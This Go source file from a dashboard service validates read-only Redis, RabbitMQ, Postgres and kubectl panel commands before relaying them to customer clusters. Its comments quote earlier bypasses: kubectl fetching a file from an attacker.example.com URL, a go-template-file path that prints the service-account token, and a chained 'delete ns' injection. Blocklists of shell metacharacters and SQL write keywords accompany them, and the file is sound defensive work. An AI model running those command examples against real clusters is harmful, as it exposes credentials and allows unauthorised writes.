package dashboard

import (
	"encoding/json"
	"fmt"
	"regexp"
	"sort"
	"strings"

	"nudgebee/services/account"
	"nudgebee/services/integrations/core"
	"nudgebee/services/relay"
	"nudgebee/services/security"
)

// A panel command runs on the customer's cluster, so the command a viewer ends
// up executing is text that some OTHER user typed into a dashboard. Three rules
// keep that from being a remote-shell:
//
//  1. The credentialed prefix (`redis-cli -h $REDIS_HOST …`) is built HERE. The
//     panel supplies only the arguments after it, so it can never rewrite the
//     host, the auth flags, or the binary.
//  2. Anything that could end the command and start another — quoting, shell
//     metacharacters, newlines — is rejected outright.
//  3. The verb must be on a read-only allowlist. `CONFIG GET` is allowed;
//     `CONFIG SET`, `FLUSHALL` and `rabbitmqadmin delete queue` are not.
//
// `kubectl` is the one datasource whose agent-side action has a guard of its own
// — and it is not one to lean on: kubectl_command_executor defaults
// `allow_crud` to TRUE, checks only that the string STARTS WITH a read verb, and
// then runs it through `shell=True`. `get pods; kubectl delete ns x` passes that
// check. The allowlist below is therefore the only thing standing between a
// dashboard panel and a write against a customer's cluster.
//
// Validation runs both at save (so the author gets told immediately) and again
// at execute — execute is the authoritative one, because rows written before a
// rule existed, and callers that hit the action directly, never pass through
// save.
const (
	redisCommandPrefix    = "redis-cli -h $REDIS_HOST --user $REDIS_USER --pass $REDIS_PASSWORD --no-auth-warning"
	rabbitmqCommandPrefix = "rabbitmqadmin --host $RABBITMQ_HOST --port $RABBITMQ_PORT --username $RABBITMQ_USER --password $RABBITMQ_PASSWORD"
	// psql reads PGHOST/PGUSER/PGPASSWORD from the integration's secret, so no
	// connection flags are needed — only output ones. `-A -F '|'` is the
	// unaligned pipe-separated format (present in every psql version, unlike
	// --csv), which parses without guessing at column widths.
	postgresCommandPrefix = `psql -A -F '|' -c`
	// The binary only — every kubectl panel supplies its own verb and args, and
	// the relay action prepends nothing.
	kubectlCommandPrefix = "kubectl"

	// maxCommandLength is generous for a real read command and small enough that
	// a pasted script is refused rather than executed.
	maxCommandLength = 512

	// KubernetesAccountProvider is `cloud_accounts.cloud_provider` for a cluster,
	// which is what a panel's AccountType holds. Compared case-insensitively
	// everywhere — the column reads `K8s` and the UI renders `K8S`.
	KubernetesAccountProvider = "K8s"
	// kubernetesAccountType is `cloud_accounts.account_type`: what the account
	// MANAGES, as opposed to who runs it. This is the authoritative check — a
	// `vm` fleet also reaches an agent, and that agent has no kubectl.
	kubernetesAccountType = "kubernetes"
	// maxQueryRows caps what one panel can pull back. `CLIENT LIST` on a busy
	// Redis is thousands of lines, which is neither readable in a panel nor
	// something to push through the gateway on every render.
	maxQueryRows = 500
)

// Characters that could chain, redirect, or substitute another command. `$` is
// included even though the prefix relies on it — the prefix is ours, the panel's
// half must not reach for an environment variable.
var unsafeCommandChars = regexp.MustCompile("[;&|<>`$\\\\\n\r\t\"']")

// SQL is the one command language that legitimately needs quotes — `WHERE state
// = 'active'` is an ordinary query — so single quotes are allowed and the rest
// of the blocklist tightens instead:
//
//   - The statement is embedded in psql's `-c "…"`, so a DOUBLE quote would
//     close that string early. Rejected (and with it `"identifier"` quoting).
//   - `;` is literal to the shell inside double quotes, but psql runs every
//     statement in one -c, so `SELECT 1; DROP TABLE x` would execute both.
//   - `$` still expands inside double quotes, which also rules out $$-quoting.
var unsafeSQLChars = regexp.MustCompile("[;<>`$\\\\\n\r\t\"]")

// Statements that may open a read. Anything else is refused outright.
var readOnlySQLPrefixes = []string{"SELECT", "WITH", "SHOW", "EXPLAIN", "TABLE", "VALUES"}

// Write verbs, rejected wherever they appear rather than only at the start —
// Postgres allows data-modifying CTEs (`WITH x AS (…) DELETE FROM …`), which
// begin with an allowed keyword. `ANALYZE` is here because `EXPLAIN ANALYZE`
// actually runs the statement; plain `EXPLAIN` is the read-only one.
//
// `INTO` is here for the same reason as the CTEs: `SELECT … INTO new_table …`
// starts with an ALLOWED prefix and creates a table, so a prefix check alone
// lets a write through. It costs the false positive of refusing a query with
// the bare word `into` in a string literal — the same trade every other verb in
// this list already makes.
var writeSQLKeywords = regexp.MustCompile(`(?i)\b(INSERT|UPDATE|DELETE|MERGE|DROP|ALTER|CREATE|TRUNCATE|GRANT|REVOKE|COPY|VACUUM|ANALYZE|REINDEX|CALL|DO|SET|RESET|REFRESH|LOCK|NOTIFY|LISTEN|PREPARE|DEALLOCATE|BEGIN|COMMIT|ROLLBACK|SAVEPOINT|INTO)\b`)

// Read-only verbs per datasource. A nil subcommand list means the verb is safe
// with any arguments; a non-nil one means the second word must be in it, which
// is what separates `CONFIG GET` from `CONFIG SET`.
var (
	redisReadOnlyCommands = map[string][]string{
		"INFO":     nil,
		"DBSIZE":   nil,
		"PING":     nil,
		"LASTSAVE": nil,
		"TIME":     nil,
		"ROLE":     nil,
		"CONFIG":   {"GET"},
		"CLIENT":   {"LIST", "INFO"},
		"MEMORY":   {"STATS", "DOCTOR", "USAGE"},
		"CLUSTER":  {"INFO", "NODES"},
		"LATENCY":  {"LATEST", "HISTORY"},
		"SLOWLOG":  {"GET", "LEN"},
		"COMMAND":  {"COUNT", "DOCS"},
	}
	// rabbitmqadmin's read verbs. Everything else it exposes — declare, delete,
	// purge, publish, get, close, import — mutates or drains.
	rabbitmqReadOnlyCommands = map[string][]string{
		"list": nil,
		"show": nil,
	}
	// kubectl's read verbs. `get` is the list verb — kubectl has no separate one.
	//
	// Everything that writes (create, apply, patch, edit, replace, delete, scale,
	// rollout, annotate, label, taint, drain, cordon, uncordon) is absent, and so
	// is everything that opens a session or a tunnel rather than returning text:
	// `exec`, `attach`, `debug`, `port-forward`, `proxy`, `cp`, `run`. `exec` is
	// worth naming because the AGENT's own allowlist permits it — a shell in a
	// customer's pod is not a dashboard panel.
	kubectlReadOnlyCommands = map[string][]string{
		"get":           nil,
		"describe":      nil,
		"logs":          nil,
		"top":           nil,
		"explain":       nil,
		"api-resources": nil,
		"api-versions":  nil,
		"version":       nil,
		"cluster-info":  nil,
	}
)

/*
Flags a kubectl panel may use, and whether each takes a separate value word.

This is an ALLOW-list, and it replaced a deny-list that lost the argument twice
over. `-f` was blocked as *streaming*, which left `--filename` open as *file
access* — and `kubectl get -f https://attacker.example.com/x.yaml` fetches that
URL from inside the customer's cluster. Worse, `-o go-template-file=<path>` read
any file on the agent: a Go template containing no actions renders itself, so
`-o go-template-file=/var/run/secrets/kubernetes.io/serviceaccount/token` prints
the agent's cluster credentials into a dashboard panel.

Both were spellings of flags nobody had thought to deny yet, which is the whole
problem with denying: every kubectl release ships the next one enabled. Here a
flag that is not listed is refused, so the next one arrives disabled and someone
has to choose to add it.

Compared VERBATIM — kubectl's short flags are case-sensitive (`-A` is
all-namespaces, `-a` is not the same flag), so folding case would accept
spellings kubectl itself rejects.
*/
var kubectlAllowedFlags = map[string]bool{
	// Scope.
	"-n": true, "--namespace": true,
	"-A": false, "--all-namespaces": false,
	"-l": true, "--selector": true,
	"--field-selector": true,
	// Presentation.
	"-o": true, "--output": true,
	"--sort-by":          true,
	"--no-headers":       false,
	"--show-labels":      false,
	"--show-kind":        false,
	"--ignore-not-found": false,
	"-R":                 false, "--recursive": false,
	// logs.
	"-c": true, "--container": true,
	"--tail": true, "--since": true, "--since-time": true, "--limit-bytes": true,
	"--all-containers": false, "--timestamps": false, "--previous": false, "--prefix": false,
}

/*
Output formats a panel may ask for.

Every `-file` variant is absent by construction, not by omission:
`go-template-file`, `jsonpath-file` and `custom-columns-file` all take a PATH on
the agent, and the first of them prints whatever is at that path. The formats
here take an inline spec or nothing at all.
*/
var kubectlAllowedOutputFormats = map[string]bool{
	"wide": true, "name": true, "json": true, "yaml": true,
	"custom-columns": true, "go-template": true,
	"jsonpath": true, "jsonpath-as-json": true,
}

// Resources a panel may not read. `kubectl get secret -o yaml` returns every
// value in the secret, base64 is not encryption, and a rendered panel is a far
// wider audience than a shell. `describe` is refused with it rather than carved
// out — one rule about one word is easier to trust than a rule per verb.
var kubectlDeniedResources = map[string]bool{
	"secret": true, "secrets": true,
}

// ValidatePanelCommand accepts only a read-only command for a command datasource.
func ValidatePanelCommand(datasource, command string) error {
	cmd := strings.TrimSpace(command)
	if cmd == "" {
		return fmt.Errorf("a %s panel needs a command", datasource)
	}
	if len(cmd) > maxCommandLength {
		return fmt.Errorf("command is too long (max %d characters)", maxCommandLength)
	}

	if datasource == DatasourcePostgres {
		return validateReadOnlySQL(cmd)
	}

	if unsafeCommandChars.MatchString(cmd) {
		return fmt.Errorf("command may contain only a plain read command — quotes, pipes, redirects and variables are not allowed")
	}

	allowed, normalize, err := commandVocabulary(datasource)
	if err != nil {
		return err
	}
	fields := strings.Fields(cmd)
	verb := normalize(fields[0])

	subcommands, ok := allowed[verb]
	if !ok {
		return fmt.Errorf("%q is not a readable %s command; allowed: %s", fields[0], datasource, strings.Join(sortedKeys(allowed), ", "))
	}
	if datasource == DatasourceKubectl {
		return validateKubectlArgs(fields[1:])
	}
	if len(subcommands) == 0 {
		return nil
	}
	if len(fields) < 2 {
		return fmt.Errorf("%s needs one of: %s", verb, strings.Join(subcommands, ", "))
	}
	sub := strings.ToUpper(fields[1])
	for _, candidate := range subcommands {
		if sub == candidate {
			return nil
		}
	}
	return fmt.Errorf("%s %s is not readable; allowed: %s", verb, fields[1], strings.Join(subcommands, ", "))
}

// validateReadOnlySQL accepts a single read-only statement.
//
// It is a keyword filter, not a parser: a column literally named `update` is
// refused. That is the intended trade — the alternative is embedding a SQL
// parser to decide whether a panel may write to a customer's database.
func validateReadOnlySQL(sql string) error {
	if unsafeSQLChars.MatchString(sql) {
		return fmt.Errorf(`a query may be a single statement with no ";", double quotes, redirects or shell variables (single quotes for values are fine)`)
	}
	upper := strings.ToUpper(sql)
	opens := false
	for _, prefix := range readOnlySQLPrefixes {
		if strings.HasPrefix(upper, prefix+" ") || upper == prefix {
			opens = true
			break
		}
	}
	if !opens {
		return fmt.Errorf("a query must start with %s", strings.Join(readOnlySQLPrefixes, ", "))
	}
	if match := writeSQLKeywords.FindString(sql); match != "" {
		return fmt.Errorf("%q is not allowed — panels may only read", strings.ToUpper(match))
	}
	return nil
}

/*
validateKubectlArgs checks everything after the verb: every flag is on the
allow-list, the output format is one a panel may ask for, and no denied resource
is named.

It reads the argument list the way kubectl does. A flag may be `--ns=x` or `--ns
x`; `-o json`, `-o=json` and `-ojson` are the same flag; and the word after a
value-taking flag belongs to that flag rather than naming a resource.
*/
func validateKubectlArgs(args []string) error {
	skipNext := false
	for _, arg := range args {
		if skipNext {
			skipNext = false
			continue
		}
		if strings.HasPrefix(arg, "-") {
			flag, _, assigned := strings.Cut(arg, "=")
			// `-ojson` is one word: the format is part of the flag rather than a
			// value beside it. Reading only the spaced and `=` spellings is how
			// `-ojson` reached the table parser as if it were `-o wide`.
			if !assigned && strings.HasPrefix(flag, "-o") && flag != "-o" {
				flag, assigned = "-o", true
			}
			takesValue, ok := kubectlAllowedFlags[flag]
			if !ok {
				return fmt.Errorf("%q is not a flag a kubectl panel may use; allowed: %s", flag, strings.Join(sortedBoolKeys(kubectlAllowedFlags), ", "))
			}
			if takesValue && !assigned {
				skipNext = true
			}
			continue
		}
		// `get po,secrets` is one argument naming two resources, so each is
		// checked — reading the whole word would let the denied one ride along
		// with an allowed one.
		for _, resource := range strings.Split(arg, ",") {
			if kubectlDeniedResources[kubectlResourceName(resource)] {
				return fmt.Errorf("%q cannot be read from a dashboard panel", resource)
			}
		}
	}

	// Checked after the loop rather than inside it: the format can be the value
	// word of `-o`, which the loop has already skipped past as that flag's own.
	if format := kubectlOutputFormat(args); format != "" {
		// `custom-columns=NAME:.metadata.name` names its format before the `=`.
		name, _, _ := strings.Cut(format, "=")
		if !kubectlAllowedOutputFormats[strings.ToLower(name)] {
			return fmt.Errorf("%q is not an output format a panel may ask for; allowed: %s", name, strings.Join(sortedBoolKeys(kubectlAllowedOutputFormats), ", "))
		}
	}
	return nil
}

/*
kubectlOutputFormat returns the output format an argument list names, or "" when
it names none.

kubectl accepts four spellings — `-o json`, `-o=json`, `-ojson` and
`--output=json` — and one place reads all four, so validation and rendering can
never disagree about what a panel asked for.
*/
func kubectlOutputFormat(args []string) string {
	for i, arg := range args {
		switch {
		case strings.HasPrefix(arg, "--output="):
			return strings.TrimPrefix(arg, "--output=")
		case strings.HasPrefix(arg, "-o="):
			return strings.TrimPrefix(arg, "-o=")
		case arg == "-o" || arg == "--output":
			if i+1 < len(args) {
				return args[i+1]
			}
		case strings.HasPrefix(arg, "-o"):
			return strings.TrimPrefix(arg, "-o")
		}
	}
	return ""
}

// kubectlResourceName reduces an argument to the resource it names, so every
// spelling of the same thing is caught by one entry in the denied set:
// `secrets`, `secret/db`, `secrets.v1.` and `Secret` all fold to `secret(s)`.
// A non-resource argument (a name, a namespace) folds to itself and matches
// nothing.
func kubectlResourceName(arg string) string {
	name := strings.ToLower(arg)
	if i := strings.Index(name, "/"); i >= 0 {
		name = name[:i]
	}
	if i := strings.Index(name, "."); i >= 0 {
		name = name[:i]
	}
	return name
}

// commandVocabulary returns the allowlist for a datasource plus how to fold a
// verb's case before looking it up.
func commandVocabulary(datasource string) (map[string][]string, func(string) string, error) {
	switch datasource {
	case DatasourceRedis:
		// Redis accepts either case, so normalise up and match once.
		return redisReadOnlyCommands, strings.ToUpper, nil
	case DatasourceRabbitMQ:
		// rabbitmqadmin is case-SENSITIVE — `LIST queues` is not a command it
		// runs. Matching case-insensitively here would pass validation and then
		// fail at the CLI with a far worse message, so compare verbatim.
		return rabbitmqReadOnlyCommands, func(s string) string { return s }, nil
	case DatasourceKubectl:
		// kubectl verbs are lowercase, and it rejects `GET` itself. Folding down
		// means `Get pods` is validated as the command the author meant.
		return kubectlReadOnlyCommands, strings.ToLower, nil
	default:
		return nil, nil, fmt.Errorf("datasource %q does not run commands", datasource)
	}
}

// ExecuteQuery runs one command-datasource panel against one account.
//
// The caller is responsible for the access check — this reaches into the
// account's cluster, so it must not be called without an account read check —
// today CanReadAccountData(accountId, "dashboards") in actions_dashboard.go.
func ExecuteQuery(ctx *security.RequestContext, req ExecuteQueryRequest) (*QueryResult, error) {
	if err := ValidatePanelCommand(req.Datasource, req.Command); err != nil {
		return nil, err
	}

	// kubectl has no integration to look up: it runs against the account's own
	// agent, so the account itself is what has to be the right kind.
	if req.Datasource == DatasourceKubectl {
		return executeKubectlQuery(ctx, req)
	}

	integration, err := core.GetIntegrationByType(ctx, req.AccountId, req.Datasource)
	if err != nil {
		return nil, err
	}
	if integration == nil {
		return nil, fmt.Errorf("no %s integration is connected to this account", req.Datasource)
	}

	// The relay executes inside the cluster and reads credentials from the k8s
	// secret the integration names, so the secret never leaves the cluster and
	// this service never handles the password.
	secretName, err := core.GetIntegrationConfigValueByName(ctx, integration.Id, "k8s_secret")
	if err != nil {
		return nil, err
	}
	if strings.TrimSpace(secretName) == "" {
		// Redis and Postgres also offer a vm_agent connection mode, which has no
		// k8s secret and no relay command path.
		return nil, fmt.Errorf("the %s integration for this account is not configured with a Kubernetes secret, which is the only mode dashboards can query", req.Datasource)
	}

	resp, err := relay.CommandExecutor(req.AccountId, buildShellCommand(req.Datasource, strings.TrimSpace(req.Command)), secretName, map[string]string{})
	if err != nil {
		return nil, err
	}
	output, ok := resp["response"].(string)
	if !ok {
		return nil, fmt.Errorf("unexpected response from the %s server", req.Datasource)
	}

	switch req.Datasource {
	case DatasourceRabbitMQ:
		return parseRabbitmqOutput(output), nil
	case DatasourcePostgres:
		return parsePsqlOutput(output), nil
	default:
		return parseRedisOutput(output), nil
	}
}

/*
executeKubectlQuery runs one kubectl panel through the cluster agent.

Two differences from the integration datasources above: there is no secret to
name (the agent's own service account is the credential), and the relay action
is kubectl_command_executor rather than a shell pod — which is also why
`allow_crud` is sent explicitly. That parameter defaults to TRUE on the agent, so
leaving it out asks the agent to accept anything; the allowlist here is the real
guard, and this is the belt to its braces.
*/
func executeKubectlQuery(ctx *security.RequestContext, req ExecuteQueryRequest) (*QueryResult, error) {
	acnt, err := account.GetAccount(ctx, req.AccountId)
	if err != nil {
		return nil, err
	}
	if !strings.EqualFold(acnt.AccountType, kubernetesAccountType) {
		return nil, fmt.Errorf("a kubectl panel runs on Kubernetes accounts only, and %s is not one", accountLabel(acnt.AccountName, req.AccountId))
	}

	command := buildShellCommand(DatasourceKubectl, strings.TrimSpace(req.Command))
	resp, _, err := relay.ExecuteAndExtractResponse(relay.RelayExecuteRequest{
		Body: relay.ActionExecuteBody{
			AccountID:  req.AccountId,
			ActionName: "kubectl_command_executor",
			ActionParams: map[string]any{
				"command":    command,
				"allow_crud": false,
			},
			Origin: "services-server",
		},
		NoSinks: true,
	})
	if err != nil {
		return nil, err
	}
	stdout, stderr := unwrapKubectlOutput(resp)
	return parseKubectlOutput(req.Command, stdout, stderr), nil
}

// accountLabel names an account the way an error message should: by name where
// there is one, by id otherwise.
func accountLabel(name, id string) string {
	if strings.TrimSpace(name) != "" {
		return name
	}
	return id
}

// unwrapKubectlOutput recovers stdout/stderr from a kubectl_command_executor
// response. The agent publishes its output as a JsonBlock, which arrives as a
// JSON STRING under `data` — the same unwrapping account/adapter does.
func unwrapKubectlOutput(resp map[string]any) (stdout, stderr string) {
	if s, ok := resp["stdout"].(string); ok {
		stdout = s
	}
	if s, ok := resp["stderr"].(string); ok {
		stderr = s
	}
	if stdout != "" {
		return stdout, stderr
	}
	data, ok := resp["data"].(string)
	if !ok || data == "" {
		return stdout, stderr
	}
	var inner struct {
		Stdout string `json:"stdout"`
		Stderr string `json:"stderr"`
		Error  string `json:"error"`
	}
	if err := json.Unmarshal([]byte(data), &inner); err != nil {
		return stdout, stderr
	}
	if inner.Error != "" {
		// The agent's own refusal ("only kubectl get commands are allowed"),
		// which is a message worth showing rather than an empty panel.
		return inner.Stdout, strings.TrimSpace(inner.Stderr + " " + inner.Error)
	}
	return inner.Stdout, inner.Stderr
}

/*
parseKubectlOutput tabulates kubectl output.

`get`, `top` and `api-resources` print a column-aligned table whose cells are
separated by RUNS of spaces — a single space is inside a value (`3/3 Running`
is two cells, `Init:0/1` is one), so the split is on two or more. Everything
else kubectl prints is prose (`describe`, `logs`, `explain`, `-o json`) and is
shown line by line, because splitting it would invent columns that are not
there.

stderr is shown only when there is no stdout: kubectl writes deprecation
warnings there on commands that succeeded, and a panel showing the warning
instead of the answer would be a regression on every one of them.
*/
func parseKubectlOutput(command, stdout, stderr string) *QueryResult {
	output := stdout
	if strings.TrimSpace(output) == "" {
		output = stderr
	}
	lines := usefulLines(output, nil)
	if len(lines) == 0 {
		return &QueryResult{Columns: []string{"Output"}}
	}

	if tabularKubectlOutput(command) {
		header := kubectlColumns.Split(lines[0], -1)
		if len(header) > 1 {
			result := &QueryResult{Columns: header, Rows: make([][]string, 0, min(len(lines)-1, maxQueryRows))}
			for _, line := range lines[1:] {
				cells := kubectlColumns.Split(line, len(header))
				row := make([]string, len(header))
				copy(row, cells)
				result.Rows = append(result.Rows, row)
			}
			return capRows(result)
		}
	}

	result := &QueryResult{Columns: []string{"Output"}, Rows: make([][]string, 0, min(len(lines), maxQueryRows))}
	for _, line := range lines {
		result.Rows = append(result.Rows, []string{line})
	}
	return capRows(result)
}

// Two or more spaces: kubectl's column separator, and never the inside of a cell.
var kubectlColumns = regexp.MustCompile(` {2,}`)

/*
tabularKubectlOutput reports whether a command prints columns.

An explicit output format usually means it does not — `-o json`, `-o yaml` and
`-o jsonpath` each print one document, however tabular the verb normally is.
`wide`, `name` and `custom-columns` stay tables.
*/
func tabularKubectlOutput(command string) bool {
	fields := strings.Fields(command)
	if len(fields) == 0 {
		return false
	}
	switch strings.ToLower(fields[0]) {
	case "get", "top", "api-resources":
	default:
		return false
	}
	format, _, _ := strings.Cut(kubectlOutputFormat(fields[1:]), "=")
	switch strings.ToLower(format) {
	case "", "wide", "name", "custom-columns":
		return true
	default:
		return false
	}
}

/*
buildShellCommand puts the validated panel command behind its credentialed
prefix.

kubectl is the one datasource whose prefix carries no credentials — the agent
already is the credential — so the prefix is just the binary, which keeps the
panel from naming another one.

Only Postgres needs the command QUOTED — psql takes the statement as one `-c`
argument, where redis-cli and rabbitmqadmin take theirs as ordinary words. The
double quotes are safe because validateReadOnlySQL has already refused any `"`,
`$`, backslash or backtick that could escape them.
*/
func buildShellCommand(datasource, command string) string {
	switch datasource {
	case DatasourceRabbitMQ:
		return rabbitmqCommandPrefix + " " + command
	case DatasourceKubectl:
		return kubectlCommandPrefix + " " + command
	case DatasourcePostgres:
		return fmt.Sprintf(`%s "%s"`, postgresCommandPrefix, command)
	default:
		return redisCommandPrefix + " " + command
	}
}

/*
parsePsqlOutput reads psql's unaligned output:

	id|name
	1|alice
	(1 row)

The `(N rows)` footer is psql's, not data. A value containing the separator
splits wrong — the price of a text protocol, and the reason the separator is
`|` rather than a comma.
*/
func parsePsqlOutput(output string) *QueryResult {
	lines := usefulLines(output, func(line string) bool {
		return psqlFooterRe.MatchString(line)
	})
	if len(lines) == 0 {
		return &QueryResult{Columns: []string{"Output"}}
	}
	// An error from psql arrives on the same channel as a result set and has no
	// header row worth splitting.
	if strings.HasPrefix(lines[0], "ERROR:") || strings.HasPrefix(lines[0], "psql:") {
		result := &QueryResult{Columns: []string{"Output"}}
		for _, line := range lines {
			result.Rows = append(result.Rows, []string{line})
		}
		return capRows(result)
	}

	columns := strings.Split(lines[0], "|")
	for i := range columns {
		columns[i] = strings.TrimSpace(columns[i])
	}
	result := &QueryResult{Columns: columns, Rows: make([][]string, 0, min(len(lines)-1, maxQueryRows))}
	for _, line := range lines[1:] {
		cells := strings.Split(line, "|")
		row := make([]string, len(columns))
		for i := range columns {
			if i < len(cells) {
				row[i] = strings.TrimSpace(cells[i])
			}
		}
		result.Rows = append(result.Rows, row)
	}
	return capRows(result)
}

var psqlFooterRe = regexp.MustCompile(`^\(\d+ rows?\)$`)

// parseRedisOutput tabulates redis-cli output.
//
// `INFO` and `CONFIG GET`-style output is `key:value` per line, which reads as a
// two-column table. Anything else (PING, DBSIZE, CLIENT LIST) is line-oriented
// and is shown as-is rather than split on a delimiter that may not mean
// anything.
func parseRedisOutput(output string) *QueryResult {
	lines := usefulLines(output, func(line string) bool {
		// `# Server` section headers carry no data.
		return strings.HasPrefix(line, "#")
	})
	keyed := 0
	for _, line := range lines {
		if strings.Contains(line, ":") {
			keyed++
		}
	}
	// Mixed output (a stray banner among key:value lines) still reads better as
	// a table, so require only a majority rather than all.
	if len(lines) > 0 && keyed*2 > len(lines) {
		result := &QueryResult{Columns: []string{"Key", "Value"}, Rows: make([][]string, 0, min(len(lines), maxQueryRows))}
		for _, line := range lines {
			key, value, found := strings.Cut(line, ":")
			if !found {
				result.Rows = append(result.Rows, []string{strings.TrimSpace(line), ""})
				continue
			}
			result.Rows = append(result.Rows, []string{strings.TrimSpace(key), strings.TrimSpace(value)})
		}
		return capRows(result)
	}

	result := &QueryResult{Columns: []string{"Output"}, Rows: make([][]string, 0, min(len(lines), maxQueryRows))}
	for _, line := range lines {
		result.Rows = append(result.Rows, []string{line})
	}
	return capRows(result)
}

// parseRabbitmqOutput reads rabbitmqadmin's ASCII table:
//
//	+-------+----------+
//	| name  | messages |
//	+-------+----------+
//	| queue | 0        |
//	+-------+----------+
//
// The first pipe row is the header. Anything that isn't a pipe row (an error
// message, `show overview`'s plain output) falls back to raw lines so the user
// sees what the server actually said instead of an empty table.
func parseRabbitmqOutput(output string) *QueryResult {
	// Parsed once and reused by the fallback below, which used to re-split the
	// whole output a second time to say the same thing.
	lines := usefulLines(output, nil)
	cells := make([][]string, 0, min(len(lines), maxQueryRows))
	for _, line := range lines {
		if !strings.HasPrefix(line, "|") {
			continue
		}
		trimmed := strings.Trim(line, "|")
		parts := strings.Split(trimmed, "|")
		row := make([]string, len(parts))
		for i, part := range parts {
			row[i] = strings.TrimSpace(part)
		}
		cells = append(cells, row)
	}

	if len(cells) == 0 {
		result := &QueryResult{Columns: []string{"Output"}, Rows: make([][]string, 0, min(len(lines), maxQueryRows))}
		for _, line := range lines {
			result.Rows = append(result.Rows, []string{line})
		}
		return capRows(result)
	}
	return capRows(&QueryResult{Columns: cells[0], Rows: cells[1:]})
}

// usefulLines trims and drops blank lines, plus whatever `skip` rejects.
func usefulLines(output string, skip func(string) bool) []string {
	var lines []string
	for _, raw := range strings.Split(strings.ReplaceAll(output, "\r\n", "\n"), "\n") {
		line := strings.TrimSpace(raw)
		if line == "" {
			continue
		}
		// rabbitmqadmin's +---+ rules are decoration.
		if strings.HasPrefix(line, "+-") {
			continue
		}
		if skip != nil && skip(line) {
			continue
		}
		lines = append(lines, line)
	}
	return lines
}

func capRows(result *QueryResult) *QueryResult {
	if len(result.Rows) > maxQueryRows {
		result.Rows = result.Rows[:maxQueryRows]
		result.Truncated = true
	}
	return result
}

// sortedBoolKeys is sortedKeys for the allow-list maps, which carry a bool
// rather than a subcommand list.
func sortedBoolKeys(m map[string]bool) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	return keys
}

func sortedKeys(m map[string][]string) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	return keys
}
